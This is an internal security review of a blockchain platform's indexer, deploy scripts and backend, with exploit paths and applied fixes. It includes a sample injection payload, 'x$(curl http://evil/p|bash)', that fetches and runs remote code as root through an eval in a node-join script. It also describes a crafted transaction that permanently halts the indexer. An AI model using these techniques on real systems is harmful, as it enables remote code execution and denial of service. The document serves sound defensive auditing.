# Cross-Component Security Review — 2026-08-13

**Baseline:** `dev` at the `v1.34.1` tag.
**Scope:** every component — `blockchain/`, `web/backend/`, `indexer/` + `shared/`, `web/frontend/`, `deploy/` + `scripts/`.
**Reporting bar:** Critical and High only, by explicit instruction. Medium, Low and Informational candidates were developed and discarded during this sweep and are deliberately not recorded; the sub-threshold notes that are mentioned appear only where they explain why an adjacent Critical/High claim was *not* filed.
**Method:** six parallel component audits, each required to produce a concrete exploit path rather than a pattern match, followed by independent re-verification of every surviving candidate against source by the reviewer. A candidate that could not be traced end to end was dropped.

**Prior state:** all Critical and High findings from the 2026-08-04 → 2026-08-09 rounds were closed before this sweep; see the component retests linked from [`open-items.md`](../open-items.md). Nothing in this document is a re-report of a known item.

> **Address hygiene.** This repository is public. Per `AGENTS.md`, hosts are referred to by role (PROD / UAT / val3 / val4) and never by address. **H-1 below is itself an address-disclosure finding, so it is written without reproducing the disclosed values** — it cites the commit and the file locations only. Do not "improve" this document by quoting them.

---

## Summary

**1 Critical, 5 High. Four fixed in this pass, two accepted as non-issues by the operator.**

| ID | Component | Finding | Status |
| :-- | :-- | :-- | :-- |
| **C-1** | Indexer | Self-service permanent indexer wedge: account self-delete poisons an earlier block, crash-looping the indexer forever | **Fixed** |
| **H-1** | Deploy | Validator fleet inventory is readable in public git history | **Non-issue** (operator decision) |
| **H-2** | Deploy | Remote RPC value reaches `eval` as root during node join (RCE) | **Fixed** |
| **H-3** | Deploy | `backup_restore.py` publishes Cosmos REST/gRPC past a firewall that cannot see them | **Fixed** |
| **H-4** | Deploy | Backup archive left world-readable in `/tmp` | **Non-issue** (operator decision) |
| **H-5** | Backend | Invite-referral reward is re-payable to the same pair, unbounded | **Fixed** — and it had already fired in production |

Two corrections to this document's own first draft, both made after checking the live fleet rather than the templates:

1. **H-5 was described as "not exploitable, gated by one env value". That was wrong.** `invite_recruit` quests were being assigned in production as recently as 2026-08-09, and the double-payout actually occurred: one account was paid the referee reward twice, three days apart, and **both were claimed and paid**. Details under H-5.
2. **C-1's delayed variant is armed, not hypothetical.** 63 accounts have been deleted on the fleet, so retained history plausibly already contains an unprojectable block.

The original standalone "CometBFT RPC 26657 is publicly exposed" candidate was dropped: the port is deliberately public, and the real issue was the address disclosure that makes it addressable (H-1), which the operator has accepted.

**Clean:** `blockchain/` and `web/frontend/` produced no Critical or High finding. Both were audited by exploit construction, not inspection; the candidates chased and the guard that killed each are recorded below, because a clean result is only meaningful if the attempts are visible.

The single most urgent item is **C-1**: it is cheap, unprivileged, deterministic, and permanent, and it takes the whole platform down rather than degrading it. **H-1** is the most urgent *irreversible* item — it cannot be fixed by rewriting history, only by rotating addresses — and it supplies the delivery path that makes C-1 and H-3 easy to aim.

---

## C-1 (Critical) — Indexer: permanent wedge via account self-delete after a profile-list message

**Status: FIXED.** See "Fix applied" at the end of this finding.

**Component:** `indexer/`. **Privilege required:** an ordinary account with a username. **Cost:** one transaction. **Effect:** indexing stops chain-wide, permanently, and the affected history becomes un-indexable.

**Live state at the time of the fix:** 63 accounts are already deleted on the fleet (`profiles.deleted_at IS NOT NULL`, consistent across all four validators, out of 3,885 profiles). Account deletion is in normal use, so the delayed variant below was armed rather than theoretical: any of those 63 that sent a profile-list message before deleting leaves a block that a replay cannot project. The live indexers were unaffected because they had already projected those blocks while the profiles still existed — which is exactly why this would only have surfaced during a rebuild or restore, at the worst possible moment.

### Exploit path

Every link was verified in source:

1. An account sends any message that makes the indexer re-read its chain profile — `MsgFollowTopic`, `MsgFollowUser`, `MsgEnableAgent`, `MsgSetBiography`, `MsgSetUsername`, `MsgSubscribe`, or `MsgSetAutoRenewal`.
2. The same account self-deletes. `MsgDeleteUser` authorizes self-delete whenever `envelope_pubkey` derives to the target (`blockchain/x/core/module/module.go:3164-3174`), and `DeleteUserState` removes the profile outright: `store.Delete(k.profileKey(addr))` (`blockchain/x/core/keeper/keeper.go:2548`).
3. From then on the chain's profile query is an **error**, not an empty profile: `if !found { return nil, fmt.Errorf("profile not found for address: %s", address) }` (`blockchain/x/core/module/module.go:1208-1210`).
4. When the indexer projects the *earlier* block, the refresh helper calls `self.chain.query_profile_full(addr)` (`indexer/message_processor.py:1253`). That is a bare gRPC unary call with no not-found handling **and no height pinning** (`indexer/chain_client.py:179-199`), so it reads current state — in which the profile is already gone — and raises `grpc.RpcError`.
5. Nothing absorbs it. The handler logs and re-raises (`indexer/message_processor.py:1389-1392`), and `_process_block` converts any per-transaction failure into a block-level abort: `raise RuntimeError(f"Error processing tx {idx} at height {height}: ...")` (`indexer/main.py:325-326`).
6. The abort rolls back the block transaction opened at `indexer/main.py:321`, so `set_checkpoint` on line 336 never runs. The checkpoint does not advance.
7. Restart re-fails identically. Catch-up resumes at `last_height + 1` (`indexer/main.py:746`) — the same poisoned block — and its loop has only `try`/`finally` with **no** `except` (`indexer/main.py:766-782`), so the exception escapes and kills the process. The live path calls `sys.exit(1)` (`indexer/main.py:818`). There is no skip-block or poison-tolerance mechanism anywhere in `main.py`; the only escape is the manual `--height` override (`indexer/main.py:741`), which deliberately records a permanent history gap.

### The trigger is deterministic, not a race

The two messages do **not** need to be timed. A single relay transaction carrying `[MsgFollowTopic, MsgDeleteUser]` puts both in one block in that order: the relay ante handler iterates every message in the transaction (`blockchain/app/ante_metasig.go:46`), `classifyMsgs` accepts a pure-relay multi-message transaction, and there is no per-transaction message cap on that path. Both messages succeed (`code == 0`), so neither is skipped as a failed transaction.

The backend only ever builds single-message transactions, so this shape does not come from the app — **it comes from broadcasting a hand-built transaction straight to the RPC port, which H-1/H-3 leave publicly reachable.** That is the interaction that makes this cheap to aim at a specific node.

A second variant needs no bundling at all: follow at height H, delete any time later. Live indexing at H already succeeded, so nothing looks wrong — but H is now permanently unprojectable for any indexer whose checkpoint is at or below it. That includes a fresh index build, a restore from an older `pg_dump`, and any node that was behind. The attacker simply never re-registers the address.

### Impact

The backend serves *all* chain state from `mirage_indexer`, so feeds, profiles, balances, blocked lists and tier state freeze at the poisoned height. It is worse than stale data: `last_processed_time` is written inside the same rolled-back transaction (`indexer/main.py:335`), so the stall trips the backend's staleness detector (`web/backend/chain.py:259-279`) and puts the whole backend into its catching-up state. The delayed variant also poisons chain *history*, which breaks the recovery path the indexer itself prescribes — "Restore a trusted PostgreSQL dump or rebuild from an empty database" (`indexer/main.py:709-710`) — because the rebuild cannot pass the poisoned block either.

### Fix applied

"Profile absent from chain" is now a legitimate post-consensus state that is skipped and logged, matching the contract already used for missing vote and edit targets.

- `blockchain/x/core/module/module.go` — `GetProfile` returns `status.Errorf(codes.NotFound, ...)` instead of a bare `fmt.Errorf`, so callers can classify the case without matching on message text. Query-only change: no state migration and no param defaults to set. It still ships through the full upgrade workflow as **v1.35.0**, with a registered handler, because it changes the chain binary and the fleet has to cross one coordinated height rather than drift onto mixed builds — a node left on the old binary keeps wedging its own indexer.
- `indexer/chain_client.py` — `query_profile_full()` returns `None` on `NOT_FOUND` and logs `profile_absent`. **Every other status still raises**, so a real node or transport failure keeps aborting the block rather than being silently recorded as "user has nothing".
- `indexer/message_processor.py` — all seven consumer call sites skip and log on `None` (five direct `query_profile_full` calls plus `set_username`, `set_biography`, `subscribe` and `set_auto_renewal` through the loader). `_require_chain_profile` is renamed `_load_chain_profile` because it no longer always returns one; it still fails hard on a malformed or empty response, which is a bug or an outage rather than a deleted user.
- `blockchain/x/core/module/delete_user_test.go` — `TestGetProfileReturnsNotFoundAfterDelete` and `TestGetProfileReturnsNotFoundForUnknownAddress` pin the status code, since the indexer's non-halting behaviour now depends on it.

**Deployment ordering matters.** The indexer fix keys on `NOT_FOUND`, which the chain only returns after the new binary is running. Both ship in the same image, so a normal deploy is consistent — but an indexer-only update would leave C-1 open.

### Related fix — unknown message types no longer halt either

Same class, found while fixing the above: `process_core_message` ended in `raise RuntimeError(f"Unhandled message type {type_url}")`, so a chain upgrade that shipped ahead of the indexer would halt it on the first unknown message and re-fail on every restart — identical permanent-wedge behaviour, triggered by an ordinary deploy skew instead of an attacker. It now logs `unhandled_message_type` at error level with the type, height and transaction hash, and continues. The tradeoff is deliberate and stated plainly: a skipped message means an incomplete index for that height, which the operator resolves by upgrading and replaying, whereas halting means total platform outage *and* a block that can never be projected.

---

## H-1 — Deploy: validator fleet inventory in public git history — **NON-ISSUE (accepted)**

**Operator decision, 2026-08-13: not a finding. The validator addresses are public knowledge anyway — a validator has to be reachable to peer.** The requirement was only ever to keep them out of the source tree, and that is already satisfied at the tip. No rotation, no history rewrite, no further action. This section is retained only so the analysis is not re-derived and re-filed by a future review.

The technical facts, for the record: commit `d13a1a9c` ("security: keep validator addresses and maintenance windows out of the repo", 2026-08-02) removed the fleet addresses from the tip **only**. The values remain in its ancestors, which are reachable from the public branches and from every tag through `v1.34.1`.

Verified: `d13a1a9c` is an ancestor of `HEAD`; the commit removes 64 address-bearing lines; and at `d13a1a9c~1` the addresses are still present in `AGENTS.md`, `deploy/templates/env/node.env` (the `PERSISTENT_PEERS` line, with `node_id@address:26656` for all four hosts) and `docs/troubleshooting/incident-recovery.md` (per-host maintenance hours). They are absent at `HEAD`, which is why this is a history finding rather than a working-tree one. Disclosed: the complete role→address mapping for all four validators including which is PROD and which is UAT, the node IDs, and the hour each validator is scheduled down.

The argued impact was that the origins sit behind a CDN so they are not directly addressable, and that knowing them lets an attacker reach `:80`, `:26656` and `:26657` directly (`deploy/harden_server.sh:330-334`), skipping the CDN WAF and Caddy's rate limiting. **That argument is rejected:** the addresses are already known, so nothing is disclosed by their presence in history. SSH is key-only with `PermitRootLogin prohibit-password` and fail2ban (`deploy/harden_server.sh:262-265`), so there is no brute-force value either.

What remains genuinely useful from this analysis is unrelated to secrecy: an attacker who can reach a validator directly bypasses Caddy's rate limiting, which is an argument for `setup_origin_firewall.sh` coverage and for not publishing more ports than necessary — the latter is H-3, which **is** fixed.

---

## H-2 (High) — Deploy: remote RPC response reaches `eval` as root during node join

**Status: FIXED.**

`deploy/init.sh:57-58` captures the stdout of `deploy/bootstrap_join.py` into `BOOTSTRAP_STATESYNC`, then executes it:

```135:138:deploy/init.sh
if [ -n "$BOOTSTRAP_STATESYNC" ]; then
  eval "$BOOTSTRAP_STATESYNC"
  echo "==> State sync enabled from trust height $STATESYNC_TRUST_HEIGHT"
fi
```

The value is taken from a remote node's JSON with no validation — `str()` cast only, no hex check (`deploy/bootstrap_join.py:112-116`) — and printed unquoted (`deploy/bootstrap_join.py:149`). A `block_id.hash` of `x$(curl http://evil/p|bash)` executes as root.

Both apparent defenses fail. The genesis hash pin (`bootstrap_join.py:71-75`) protects chain identity, not this value. Cross-endpoint agreement (`bootstrap_join.py:118-120`) requires two endpoints to return the *same* hash, which stops one lying server but not a network MITM — and the prescribed transport is plaintext: `rpc()` does no scheme check (`bootstrap_join.py:42-45`), and `.env.example:22-24` explicitly directs operators to `http://host:26657` because the CDN does not proxy that port. `deploy/deploy.sh:670-680` seeds that value verbatim into the remote `BOOTSTRAP_RPC`.

**Impact.** Root RCE inside the container during `deploy.sh --init` — the same window in which the operator pipes a 12-word mnemonic in to derive the validator's consensus and account keys (`deploy/deploy.sh:619-633`).

### Fix applied

The `eval` is gone rather than merely sanitized, so this does not depend on the validation being exhaustive:

- `deploy/init.sh` parses the four `KEY=VALUE` lines with `while IFS='=' read`, accepts only the four expected keys, and validates each value — `STATESYNC_ENABLE` must be exactly `true`, the height must be a positive integer, and the hash must match `^[0-9A-Fa-f]{64}$`. Any unexpected key or malformed value exits non-zero.
- `deploy/bootstrap_join.py` also rejects a non-hex `block_id.hash` at the source (`BLOCK_HASH_RE`), so a hostile response fails with a clear error before it ever reaches the shell.

`https` is **not** enforced, deliberately: `.env.example` documents `http://host:26657` because the CDN does not proxy that port, so requiring TLS would break the documented bootstrap. Removing the `eval` closes the RCE regardless of transport, which is why it was the right fix rather than the transport change.

**Verified** by extracting the parser from `init.sh` and running it against the legitimate response plus three payloads — command substitution in the hash, a shell metacharacter in the height, and an injected extra key. The legitimate response is accepted; all three are rejected with a specific error and nothing executes.

---

## H-3 (High) — Deploy: restore publishes Cosmos REST/gRPC past a firewall that cannot see them

**Status: FIXED.** Live check first: **no host is currently in the exposed state.** All four validators publish only `80`, `443` and `26656-26657`, so no post-restore container with `1317`/`9090` is running. This was a latent trap waiting for the next restore, not an active exposure.

Steady-state deploy publishes four ports (`deploy/deploy.sh:705`): `80`, `443`, `26656`, `26657`. All three `docker run` invocations in `scripts/backup_restore.py` — including both **final**, `--restart unless-stopped` containers at `:1075` and `:1095`, not just the temporary one at `:969` — publish three more: `1317`, `9090`, `5000`.

Two of those are live services bound to all interfaces inside the container: `[api] enable = true`, `enabled-unsafe-cors = true`, `tcp://0.0.0.0:1317` and `[grpc] enable = true`, `0.0.0.0:9090` (`deploy/templates/node/app.toml:53-60`). The third is inert — `entrypoint.sh:100` and `:586` bind gunicorn to `127.0.0.1`, so nothing listens on the container's routable interface for `5000`.

**The firewall cannot restrict the other two.** `deploy/harden_server.sh:327-335` contains only ufw INPUT rules, and Docker's published ports are DNAT'd through `FORWARD`/`DOCKER-USER`, never `INPUT` — a bypass this codebase documents in its own comment at `deploy/setup_origin_firewall.sh:127-129`. I confirmed there are **no `DOCKER-USER` rules anywhere** in `deploy/` or `scripts/` (the only textual hit is that comment), and the single Docker-aware nft hook decides `tcp/443` only. So `1317` and `9090` are publicly exposed despite never being allowed by ufw.

**Impact.** After any restore, a consensus-critical validator serves an unauthenticated, un-rate-limited chain query API to the internet, outside Caddy and outside the CDN. `deploy/templates/node/app.toml:15` sets `query-gas-limit = "0"`, whose own comment reads "the query can consume an unbounded amount of gas" — so one crafted REST or gRPC query is an unbounded-CPU DoS against a validator.

### Fix applied

`scripts/backup_restore.py` gains a single `CONTAINER_PORTS` constant holding exactly the `deploy.sh:705` set (`80`, `443`, `26656`, `26657`), used by all three `docker run` invocations. Defining it once is the point: three hand-maintained copies are what let the restore path drift from the deploy path in the first place. The comment records why `1317`/`9090` must never be added back and that `5000` was a no-op.

**Not done:** the default-deny `DOCKER-USER` rule. It is the stronger structural guard — it would make *any* stray `-p` non-public rather than relying on the port lists staying correct — but it changes packet filtering on live validators, which is out of scope for a source fix and needs its own change window. Recorded as deferred in `open-items.md`.

---

## H-4 — Deploy: backup archive world-readable in `/tmp` — **NON-ISSUE (accepted)**

**Operator decision, 2026-08-13: not a finding. These are the operator's own backups on the operator's own hosts, and the exposure is accepted.** No code change. Retained so it is not re-filed.

The one factual note worth keeping: the hosts are single-tenant with key-only root SSH, so "any local non-root account" — the premise of the original impact argument — is not a population that exists here. A live check found **no `/tmp/restore.tgz` and no stray `/tmp/mirage-backup-*.tgz` on any of the four validators**, so nothing is sitting exposed right now regardless.

The technical facts, for the record: the archive is all of `~/.mirage` minus a narrow exclude list (`scripts/backup_restore.py:537-548`) that does **not** exclude key material, so it contains `node/config/priv_validator_key.json`, `node/keyring-test/*` — the `test` backend is unencrypted at rest — and `env/secrets.env` with the CDN and Telegram tokens.

It is uploaded through a plain shell redirect, so the remote file is created by root's shell under the default `umask 022`, i.e. mode `0644`:

```729:730:scripts/backup_restore.py
                ssh_proc = subprocess.Popen(
                    ["ssh", conn, "cat > /tmp/restore.tgz"],
```

No `umask` or `install -m` appears anywhere in the script. Deletion is **opt-out**: anything other than the exact string `confirm` keeps the file (`scripts/backup_restore.py:1142-1147`), and it is otherwise removed only at the start of the *next* run (`:421`). The local copy is likewise a bare `open(local_path, "wb")` (`:550`). The transport itself (SSH) is fine; the at-rest handling is not.

The argued impact was that the validator's consensus identity, funded account key and provider tokens sit at a predictable path indefinitely, converting any later limited-privilege foothold into total validator compromise. **Accepted as the operator's own risk on the operator's own machines.** If it is ever revisited, the fix is one line: `install -m 600 /dev/null /tmp/restore.tgz` before the upload (or `umask 077`), plus unconditional deletion after a verified extraction instead of the current opt-out prompt.

---

## H-5 (High) — Backend: invite-referral reward is re-payable to the same pair

**Status: FIXED. This one was live and it fired in production.**

**Correction to this document's first draft.** H-5 was originally filed as "not exploitable, gated by `QUESTS_INVITE_RECRUIT_CHANCE=0`". That was wrong, and only checking the live database showed it:

- `invite_recruit` quests were assigned on **190 distinct days from 2026-01-31 through 2026-08-09**, at 1–3 per day — the most recent four days before this review. 1,476 assignment rows exist, 262 of them completed. The referrer-side precondition has therefore been continuously satisfiable for months. The `0` currently in the env files stopped assignment only very recently.
- The precondition on the referee side is met at scale: **1,965 redeemed invite codes** on PROD.
- **The double payout actually happened.** One address received `quest:invite_referred` twice — `created_at` 2026-04-15 00:57 UTC and 2026-04-18 02:16 UTC, three days apart — and **both rows were claimed and paid at 10,000,000,000 umirage (10k MIRAGE) each.** A referee can only legitimately be referred once, so this is the replay path below, not a second referral. The matching referrer-side payment is indistinguishable from a legitimate recruit in `pending_rewards`, which is itself a consequence of the missing pair-level record.

To avoid overstating it: the referrer-side distribution (one address with 17 recruit rewards, one with 12, one with 11) is **consistent with legitimate multi-recruit referrers** and is not by itself evidence of replay — those 92 rewarded referrers own 1,446 redeemed codes between them, far more than the 230 rewards paid. The clean, unambiguous evidence is the single referee paid twice. So: at least one confirmed incident of roughly 20k MIRAGE over-issued across both sides, against 8,497,701 MIRAGE paid in invite rewards overall (369 claimed rows).

`_process_invite_quest_completion` is called at `web/backend/routes/core.py:1358` with **no `is_new_user` guard** — unlike every other post-registration side effect on that route, e.g. line 1301's `is_new_user and has_direct_code and code == 0` — and it is not conditioned on the transaction succeeding either. Inside, Step 1 finds the referral via `invite_codes.used_by` (`core.py:263-272`), a row that persists forever after the original redemption, so an old referral keeps satisfying the check. Steps 4 and 6 then insert two fresh 10k MIRAGE rows into `pending_rewards` (`core.py:318-324`, `:339-345`).

The replay is unbounded because nothing stops the referee re-triggering it: there is **no cooldown or one-time check on username changes** in either the backend or the chain module, and the chain permits changing an existing profile's username. The unique index on `pending_rewards` does not help — it covers `(owner, reward_type, reason, created_at)` (`web/backend/db.py:599-602`) where `created_at` is the current unix second, so it blocks only same-second duplicates, not the once-per-day replay this produces. The only idempotency present is the referrer's per-day quest row, which resets daily.

`QUESTS_INVITE_RECRUIT_CHANCE=0` (`deploy/templates/env/backend.env:70`) does suppress it while it is `0`, because assignment is a strict `value < chance` against a non-negative roll (`web/backend/quest_assignment.py:151`). But that value is a live feature switch, not a security control, and the production data above shows it was non-zero for most of 2026. Relying on it was the mistake in the original assessment.

### Fix applied

`web/backend/routes/core.py` — `_process_invite_quest_completion` is now called only when `is_new_user and code == 0`. That is deliberately the small fix: `is_new_user` is derived from the chain profile having no username, so it is true exactly once per account, which makes the payout unrepeatable no matter how the referrer's quest state changes. Adding `code == 0` also stops a *failed* username transaction from paying out, which the old unguarded call did.

**Not done, by decision:** the pair-level idempotency guard (only pay when no reward exists for that `(referrer, referee)` pair) and the missing `QUESTS_ENABLED` check. The `is_new_user` gate already makes the replay unreachable, and referral rewards are currently off; a pair-level record would be the more thorough design but is not needed to close the hole. Recorded in `open-items.md` so it is a known choice rather than an oversight.

**Historical over-issuance is not reconciled.** The ~20k MIRAGE from the April incident remains paid. Reversing it would need a separate decision; it is recorded here so the number is not lost.

---

## Blockchain — no Critical or High

Six exploits were constructed and each died on a specific verified guard.

- **Governance-authority impersonation via the relay path.** Both `RelaySigDecorator` and `PowDecorator` skip verification entirely when `Authority == govAuthority` (`ante_metasig.go:49`, `ante_pow.go:302`), and the handlers then trust the message as governance — so this was the highest-value candidate. Three independent guards close it: `GovAuthorityDecorator` sits at position 3 of the relay chain, ahead of both envelope decorators, and rejects unconditionally (`ante_relay_chain.go:52`, `ante_gov_authority.go:20-29`); the router forces any gov-authority transaction onto the std path where the same decorator wraps it (`app.go:194-200`, `:215`); and `option (cosmos.msg.v1.signer) = "authority"` (`tx.proto:807`) would make `SigVerificationDecorator` demand a signature from the gov module address. Comparison direction is fail-closed — ante guards trim, handlers use exact equality — so a whitespace-padded authority is rejected rather than honored.
- **Relay operator tampering with a field the envelope does not sign.** The strongest structural threat, since the relay signs the outer transaction. Diffing every relay message's proto fields against its canon writer: `MsgSendTokens` signs sender, target and amount (`ante_metasig.go:756-758`); `MsgSubscribe` signs level and target (`:882-885`); `MsgAward` signs target and type (`:959-960`); `MsgEdit` signs the target post hash in `override` (`:798`). `MsgAnnotate` looked like a genuine gap because its writer never emits tag 100 (`:836`), but the proto has no `target` field at all — agents cannot re-parent posts (`tx.proto:822`) — and the annotated post travels in `override`, which is signed (`:840`).
- **PoW reuse / bulk precompute / cross-chain replay.** The Argon2id preimage is the full per-message canon plus the candidate value, salted with a block hash (`ante_pow.go:1474-1486`), binding a solution to one exact body and nonce. Replay is closed at three layers: the nonce must be non-zero and unseen and is recorded in the ante (`ante_metasig.go:57-89`), which commits even when the handler later fails, so a nonce burns exactly once; the timestamp must fall in the age window with bounded future skew (`:1058-1089`); and `envelope_block_hash` must be in the on-chain rolling window (`ante_pow.go:1453-1471`).
- **A message type skipping PoW or signature checks.** Relay routing comes from one registry (`relay_messages.go`, consumed at `app.go:231-234`) and both decorators end in `default: return error` (`ante_pow.go:868`, `ante_metasig.go:973`), so an unlisted type cannot pass silently. The four types that legitimately skip PoW each reject a nonzero `envelope_pow` and require payment instead. Mixed relay/non-relay transactions are rejected outright (`app.go:208-211`).
- **Relay-credit farming for mint rewards.** `AccToValoper` is a pure bech32 re-encoding with no validator-existence check (`keeper.go:1082`), so any account can write a credit entry — but interval distribution iterates the real staking validator set and only reads credits for those operator addresses (`keeper.go:1866`), caps them, and wipes all credits each interval (`:1987`). A non-validator's entries are unreachable dead keys.
- **User-triggerable consensus halt via subscription state.** `processSubscriptions` returns `CONSENSUS_FATAL:PROFILE_MISSING` for an index entry with no profile (`module.go:967`), which would be a remote halt primitive. Every index write is preceded by removal of the profile's current expiry (`module.go:3559`, `:3647`, `:953`), and `DeleteUserState` removes the entry using the expiry from the profile it just decoded (`keeper.go:2600-2605`), so no orphan is reachable.

## Frontend — no Critical or High

No HTML-injection sink exists on any user-content path, and key handling is sound. The default `insecure` localStorage seed storage is a recorded product decision rather than a new finding, and it is what makes the absence of an XSS sink load-bearing rather than merely tidy.

## Also examined and adequately guarded

- **SQL injection, backend and indexer.** An AST scan of every Python file confirmed all queries are parameterized and no request-derived value is interpolated into SQL. The f-string sites interpolate fixed identifiers from internal constants or generated `%s` placeholder lists, never data; `unblock_topics_matching` passes hostile wildcards as a bound parameter.
- **Backend identity and authority.** All 29 `routes/core.py` endpoints derive the acting address from `envelope_pubkey`, never from a client field, and `authority` is set from the validator address at all 25 relay sites. Every relay message type has a matching `RelaySigDecorator` case, so the endpoints that skip a backend-side signature check are still authenticated on-chain before execution.
- **Backend replay protection.** `push_nonces` really carries `UNIQUE(owner, action, nonce)` (`db.py:442-450`), so the `ON CONFLICT DO NOTHING RETURNING` pattern is not a silent no-op, and it fails closed to 503.
- **Diverged-state forensics chokepoint.** Holds. The only chain-DB `rm -rf` is inside `wipe_chain_dbs`, which calls `snapshot_diverged_state` unconditionally and is not gated by `--force`; both callers route through it and `set -euo pipefail` makes the unchecked `cd` fail safe.
- **Secret scanning.** Working tree and all 1,767 commits: no private keys, mnemonics, SSH keys or provider tokens. The two assigned-value hits are a by-design public client key returned to every browser, and localhost-only Postgres defaults on an unpublished port.
- **Docker and CI posture.** No docker socket mount, no `--privileged`, no `--cap-add`, no host networking. Workflows trigger on `push`/`pull_request` only, consume no secrets, and interpolate no event data into `run:`.
- **Mnemonic handling in deploy.** Read with `read -s`, piped over SSH into container stdin rather than argv or env, `chmod 600` on the derived key, never logged.

## Live fleet verification

The items the source review could not settle were then checked directly against all four validators, **read-only** — `docker ps`, `ls`, env greps and `SELECT` queries only. Nothing was modified on any host, including PROD.

| Check | Result | Bearing |
| :-- | :-- | :-- |
| Published container ports, all four hosts | `80`, `443`, `26656-26657` only — no `1317`/`9090` anywhere | **H-3** was latent, not live |
| `/tmp/restore.tgz`, `/tmp/mirage-backup-*.tgz` | Absent on all four | **H-4** nothing exposed now |
| `QUESTS_INVITE_RECRUIT_CHANCE` in live env | `0` on all four | Suppresses **H-5** *currently* — but see below |
| `invite_recruit` assignment history (PROD) | 1,476 rows, 2026-01-31 → 2026-08-09, 262 completed | **H-5 was live for months**, contradicting the original "config-gated" call |
| Redeemed invite codes (PROD) | 1,965 | **H-5** referee-side precondition met at scale |
| Duplicate invite rewards (PROD) | One referee paid `quest:invite_referred` twice, 3 days apart, **both claimed and paid** 10k MIRAGE each | **H-5 fired in production** |
| Invite rewards paid overall (PROD) | 369 claimed rows, 8,497,701 MIRAGE | Scale context for H-5 |
| Deleted profiles | 63 of 3,885, consistent across the fleet | **C-1**'s delayed variant was armed |
| Indexer checkpoints | ~6,798,490, all four within a few blocks | No indexer was wedged at review time |

Two things remain genuinely unverifiable from here, and neither is load-bearing for any finding above: real Argon2id cost per message under production load, and live consensus params versus genesis (which is what actually bounds messages per transaction).

## Verification of the fixes

- `blockchain/`: `go build ./...` clean, `go test ./...` fully green, including the two new `NOT_FOUND` regression tests.
- `deploy/init.sh`: parser extracted and exercised against the legitimate bootstrap response plus three injection payloads — legitimate accepted, all three rejected, nothing executed.
- `scripts/backup_restore.py`, `deploy/bootstrap_join.py`, `indexer/*`, `web/backend/routes/core.py`: parse clean, no linter errors, and no remaining `1317`/`9090` in any `-p` list.
- Not run: `tests/test_backend.py` and `tests/test_blockchain.py`. Both submit real transactions and may only run inside local docker after raising the PoW limit; the C-1 path in particular wants an end-to-end reindex test over a block containing a self-delete, which is the natural next step and is recorded in `open-items.md`.
